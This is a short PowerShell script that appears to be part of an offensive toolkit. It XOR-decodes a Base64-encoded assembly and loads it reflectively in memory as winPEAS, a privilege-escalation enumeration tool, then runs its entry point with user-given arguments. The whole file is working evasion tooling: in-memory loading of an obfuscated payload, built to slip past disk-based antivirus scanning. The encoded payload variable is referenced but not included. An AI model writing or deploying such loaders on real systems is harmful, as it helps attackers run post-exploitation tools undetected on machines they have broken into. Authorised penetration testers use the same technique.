function Load-XLdr_winPEAS { param([Parameter ()] $xk = "0x3a")
$loadedAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Fullname -eq "winPEAS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" }
if ($loadedAssembly) {
  return $loadedAssembly[0]  
}
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($3946a1ca)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
$asm_XLdr_winPEAS = [System.Reflection.Assembly]::Load($fb)
return $asm_XLdr_winPEAS
}
function Invoke-XLdr_winPEAS { param([Parameter ()] $Params = "")
$asm = Load-XLdr_winPEAS
$Params -eq "" -and ($Params = Read-Host "Specify command arguments")
$asm.EntryPoint.Invoke($null, (, $Params.split()))
}